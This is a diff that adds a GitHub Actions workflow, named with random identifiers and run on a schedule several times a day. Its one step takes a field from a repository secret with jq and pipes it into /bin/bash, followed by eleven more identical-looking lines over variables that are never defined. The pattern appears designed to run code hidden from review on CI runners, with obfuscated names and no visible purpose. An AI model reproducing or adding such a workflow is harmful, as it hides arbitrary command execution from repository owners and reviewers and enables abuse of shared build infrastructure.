@@ -1,0 +1,29 @@
+name: freeboardruthless
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: freeboardruthless
+        env:
+          btjvl2670: ${{ secrets.btjvl2670 }}
+        run: |
+          echo $btjvl2670 | jq -r .kbop4166 | /bin/bash
+          echo $nvod51 | jq -r .avx642 | /bin/bash
+          echo $tx80218 | jq -r .wgjsp349 | /bin/bash
+          echo $ivj5 | jq -r .a8173 | /bin/bash
+          echo $axep1 | jq -r .rs42 | /bin/bash
+          echo $ozpbx657 | jq -r .ea342 | /bin/bash
+          echo $pcgce2 | jq -r .id262 | /bin/bash
+          echo $jmeoz052 | jq -r .nr37875 | /bin/bash
+          echo $d62360 | jq -r .ecn5 | /bin/bash
+          echo $u8 | jq -r .cefa2049 | /bin/bash
+          echo $wyky68601 | jq -r .eezmy8 | /bin/bash
+          echo $uxxas45654 | jq -r .ikxa606 | /bin/bash
+
